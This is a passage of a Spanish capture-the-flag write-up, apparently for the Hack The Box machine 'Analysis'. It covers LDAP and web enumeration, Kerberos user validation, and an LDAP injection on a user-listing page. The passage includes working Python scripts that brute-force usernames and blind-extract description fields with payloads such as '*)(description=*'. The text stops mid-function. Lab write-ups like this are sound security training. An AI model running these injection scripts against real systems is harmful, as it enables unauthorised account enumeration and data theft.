</span></span><span style="display:flex;"><span>;; WHEN: Mon Aug <span style="color:#ae81ff">12</span> 19:48:19 CEST <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">83</span>
</span></span></code></pre></div><h1 id="ldap-enumeration">LDAP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ldapsearch -x -H ldap://10.129.230.179 -D <span style="color:#e6db74">&#39;&#39;</span> -w <span style="color:#e6db74">&#39;&#39;</span> -b <span style="color:#e6db74">&#34;DC=internal,DC=analysis,DC=htb&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;DC=internal,DC=analysis,DC=htb&gt; with scope subtree</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectclass=*)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: ALL</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">1</span> Operations error
</span></span><span style="display:flex;"><span>text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
</span></span><span style="display:flex;"><span> tion a successful bind must be completed on the connection., data 0, v4563
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 1</span>
</span></span></code></pre></div><p>Por LDAP sin credenciales tampoco conseguimos nada.</p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://analysis.htb
</span></span><span style="display:flex;"><span>http://analysis.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>mail@demolink.org,privacy@demolink.org<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.230.179<span style="color:#f92672">]</span>, JQuery, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, Script<span style="color:#f92672">[</span>text/javascript<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/analysis/scan<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ whatweb http://internal.analysis.htb
</span></span><span style="display:flex;"><span>http://internal.analysis.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">403</span> Forbidden<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.230.179<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">403</span> - Interdit�: acc�s refus�.<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Vemos que <code>internal.analysis.htb</code> y <code>analysis.htb</code> devuelven información distinta por lo cual podemos deducir que se está aplicando virtual hosting por detrás.</p>
<h2 id="enumerating-analysishtb">Enumerating <code>analysis.htb</code></h2>
<p>Esta es la pinta del sitio web.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Detectamos un nombre de usuario.</p>
<p><img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>También encontramos un archivo PHP que se le manda varia data por POST.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Si intentamos mandar una solicitud POST con la data que vemos en el script JS, vemos lo siguiente.</p>
<p>Un error 500 pero en francés. Esto hay que tenerlo en cuenta ya que cuentas de sistema como la cuenta de Administrador, puede que se llame <code>Administrateur</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X POST http://analysis.htb/bat/MailHandler.php --data <span style="color:#e6db74">&#34;name=holaholahola&amp;state=holahgolaholah&amp;phone=7227272722&amp;fax=722727272&amp;message=hjolhoalhaoh&#34;</span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style="color:#e6db74">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;html xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=iso-8859-1&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;500 - Erreur interne au serveur.&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;!--
</span></span><span style="display:flex;"><span>body<span style="color:#f92672">{</span>margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>fieldset<span style="color:#f92672">{</span>padding:0 15px 10px 15px;<span style="color:#f92672">}</span> 
</span></span><span style="display:flex;"><span>h1<span style="color:#f92672">{</span>font-size:2.4em;margin:0;color:#FFF;<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>h2<span style="color:#f92672">{</span>font-size:1.7em;margin:0;color:#CC0000;<span style="color:#f92672">}</span> 
</span></span><span style="display:flex;"><span>h3<span style="color:#f92672">{</span>font-size:1.2em;margin:10px <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> 0;color:#000000;<span style="color:#f92672">}</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:&#34;trebuchet MS&#34;, Verdana, sans-serif;color:#FFF;</span>
</span></span><span style="display:flex;"><span>background-color:#555555;<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#content{margin:0 0 0 2%;position:relative;}</span>
</span></span><span style="display:flex;"><span>.content-container<span style="color:#f92672">{</span>background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>--&gt;
</span></span><span style="display:flex;"><span>&lt;/style&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;
</span></span><span style="display:flex;"><span>&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;div id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;header&#34;</span>&gt;&lt;h1&gt;Erreur de serveur&lt;/h1&gt;&lt;/div&gt;
</span></span><span style="display:flex;"><span>&lt;div id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span> &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;content-container&#34;</span>&gt;&lt;fieldset&gt;
</span></span><span style="display:flex;"><span>  &lt;h2&gt;500 - Erreur interne au serveur.&lt;/h2&gt;
</span></span><span style="display:flex;"><span>  &lt;h3&gt;La ressource que vous recherchez pr�sente un probl�me, elle ne peut donc pas �tre affich�e.&lt;/h3&gt;
</span></span><span style="display:flex;"><span> &lt;/fieldset&gt;&lt;/div&gt;
</span></span><span style="display:flex;"><span>&lt;/div&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;
</span></span><span style="display:flex;"><span>&lt;/html&gt;
</span></span></code></pre></div><p>No encuentro nada relevante sobre este archivo.</p>
<h2 id="enumerating-internalanalysishtb">Enumerating <code>internal.analysis.htb</code></h2>
<p>Con <code>feroxbuster</code> podemos encontrar varias rutas que puede que nos interese.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        2l       10w      170c http://internal.analysis.htb/users <span style="color:#f92672">=</span>&gt; http://internal.analysis.htb/users/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        2l       10w      174c http://internal.analysis.htb/dashboard <span style="color:#f92672">=</span>&gt; http://internal.analysis.htb/dashboard/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        2l       10w      170c http://internal.analysis.htb/Users <span style="color:#f92672">=</span>&gt; http://internal.analysis.htb/Users/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        2l       10w      174c http://internal.analysis.htb/employees <span style="color:#f92672">=</span>&gt; http://internal.analysis.htb/employees/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        2l       10w      174c http://internal.analysis.htb/Dashboard <span style="color:#f92672">=</span>&gt; http://internal.analysis.htb/Dashboard/
</span></span></code></pre></div><p>Después de fuzzear un rato, encontramos algunos recursos interesantes bajo <code>/dashboard</code>.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Y encontramos algo que me llama mucho la atención en <code>/users</code>
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Me pide un parámetro.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Esto nos viene perfectos ya que como kerberos está abierto, quizás podemos listar usuarios y pensar en algún vector de ataque.</p>
<p>Solo falta descubrir cual es el parámetro que necesita, así que con <code>wfuzz</code> vamos a fuzzear los parámetros.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wfuzz --hh<span style="color:#f92672">=</span><span style="color:#ae81ff">17</span> -c -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u <span style="color:#e6db74">&#39;http://internal.analysis.htb/users/list.php?FUZZ=loquesea&#39;</span>
</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://internal.analysis.htb/users/list.php?FUZZ<span style="color:#f92672">=</span>loquesea
</span></span><span style="display:flex;"><span>Total requests: 6453
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                  
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000003598:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">11</span> W       <span style="color:#ae81ff">406</span> Ch      <span style="color:#e6db74">&#34;name&#34;</span>
</span></span></code></pre></div><p>Y encontramos el parámetro <code>name</code></p>
<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Ahora bien, debo de saber que nombres de usuario hay que introducir para ver su información así que estamos en las mismas.</p>
<p>Pero por detrás se debe de estar haciendo alguna consulta a una base de datos.</p>
<h2 id="ldap-injection">LDAP Injection</h2>
<p>Tras probar varios payloads para una SQLi, probé el asterisco <code>*</code> y me devolvió un usuario. Esto es un indicio de que por detrás se están haciendo consultas por LDAP.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Vamos a scriptear esto con python para descubrir usuarios.</p>
<p>Esta es la primera versión del script para buscar usuarios.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html2text
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> product
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://internal.analysis.htb/users/list.php&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>charset <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase  <span style="color:#75715e"># a-z</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>h2t <span style="color:#f92672">=</span> html2text<span style="color:#f92672">.</span>HTML2Text()
</span></span><span style="display:flex;"><span>h2t<span style="color:#f92672">.</span>ignore_linkgs <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>user_regex <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&lt;strong&gt;(.*?)&lt;/strong&gt;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">def_handler</span>(x,y):
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Saliendo..&#34;</span>)
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Usuarios recuperados </span><span style="color:#e6db74">{</span>len(users)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users:
</span></span><span style="display:flex;"><span>        print(user)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT,def_handler)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_user</span>(prefix):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>base_url<span style="color:#e6db74">}</span><span style="color:#e6db74">?name=</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">*&#34;</span>
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;CONTACT_&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> user_regex<span style="color:#f92672">.</span>search(response<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found user with prefix &#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;: | user -&gt; </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        print(h2t<span style="color:#f92672">.</span>handle(response<span style="color:#f92672">.</span>text))
</span></span><span style="display:flex;"><span>        users<span style="color:#f92672">.</span>append(name)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enumerate_users</span>():
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Probando&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> length <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">9</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> prefix <span style="color:#f92672">in</span> product(charset, repeat<span style="color:#f92672">=</span>length):
</span></span><span style="display:flex;"><span>            prefix_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(prefix)
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>status(prefix_str)
</span></span><span style="display:flex;"><span>            check_user(prefix_str)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Iniciando fuerza bruta&#34;</span>)
</span></span><span style="display:flex;"><span>    enumerate_users()
</span></span></code></pre></div><p>Después de esperar un rato recuperamos algunos usuarios.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Found user with prefix <span style="color:#e6db74">&#39;te&#39;</span>: | user -&gt; technician
</span></span><span style="display:flex;"><span><span style="color:#75715e">## Search result  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Username| Last Name| First Name| Company| Department| Office Phone| Fax|
</span></span><span style="display:flex;"><span>Mobile| DDI| E-Mail Address| Home Phone  
</span></span><span style="display:flex;"><span>---|---|---|---|---|---|---|---|---|---|---  
</span></span><span style="display:flex;"><span>**technician**| |  technician| | | | | | | | 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saliendo..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Usuarios recuperados <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>amanson
</span></span><span style="display:flex;"><span>badam
</span></span><span style="display:flex;"><span>jangel
</span></span><span style="display:flex;"><span>lzen
</span></span><span style="display:flex;"><span>technician
</span></span><span style="display:flex;"><span>amanson
</span></span><span style="display:flex;"><span>badam
</span></span><span style="display:flex;"><span>jangel
</span></span><span style="display:flex;"><span>lzen
</span></span><span style="display:flex;"><span>technician
</span></span></code></pre></div><p>Quitando los duplicados.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sort users.dup.txt | uniq &gt; users.txt
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/analysis/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ cat users.txt
</span></span><span style="display:flex;"><span>amanson
</span></span><span style="display:flex;"><span>badam
</span></span><span style="display:flex;"><span>jangel
</span></span><span style="display:flex;"><span>lzen
</span></span><span style="display:flex;"><span>pleazkin
</span></span><span style="display:flex;"><span>technician
</span></span></code></pre></div><p>Podemos confirmar que estos usuarios son válidos a nivel de sistema con <code>kerbrute</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute userenum --dc 10.129.230.179 -d analysis.htb  users.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 08/12/24 - Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  	10.129.230.179:88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 amanson@analysis.htb
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 badam@analysis.htb
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 lzen@analysis.htb
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 jangel@analysis.htb
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 technician@analysis.htb
</span></span><span style="display:flex;"><span>2024/08/12 20:39:37 &gt;  Done! Tested <span style="color:#ae81ff">6</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> valid<span style="color:#f92672">)</span> in 0.043 seconds
</span></span></code></pre></div><p>Podemos probar a solicitar un ticket TGT pero esto no sirve..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-GetNPUsers -no-pass -usersfile users.txt analysis.htb/
</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User amanson doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User badam doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User jangel doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User lzen doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User technician doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span></code></pre></div><p>Por lo cual, podemos intentar recuperar el campo <code>description</code> que existe por defecto para ver si contiene algo para cada usuario.</p>
<p>Primero debemos fabricar nuestro payload.</p>
<p>Después de un rato probando (no tengo mucha experiencia en inyecciones LDAP), encontramos lo siguiente.</p>
<p>Este payload me devuelve algo:
<code>*)(description=*</code></p>
<p><img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Pero este otro payload no <code>*)(description=A</code>
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Esto significa que tenemos una inyección a ciegas, y podemos filtrar la descripción de cada usuario.</p>
<p>Falta scriptearlo. Si esto no funciona, podemos modificar el script para descubrir campos que quizás nos interesen.</p>
<p>Primero me interesa saber que usuarios tienen una descripción.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://internal.analysis.htb/users/list.php?name=&lt;USER&gt;)(description=&lt;DESC&gt;&#34;</span>
</span></span><span style="display:flex;"><span>DEFAULT_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">406</span>
</span></span><span style="display:flex;"><span>alphabet <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_@</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">-/!</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$%=^[]:;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute</span>(user):
</span></span><span style="display:flex;"><span>    forged_url <span style="color:#f92672">=</span> URL<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;USER&gt;&#34;</span>, user)
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Probando carácter -&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>status(char)
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(forged_url<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;DESC&gt;&#34;</span>, char <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len(r<span style="color:#f92672">.</span>text) <span style="color:#f92672">!=</span> DEFAULT_LEN):
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;El usuario </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> tiene descripción&#34;</span> <span style="color:#f92672">%</span> user)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">desc</span>():
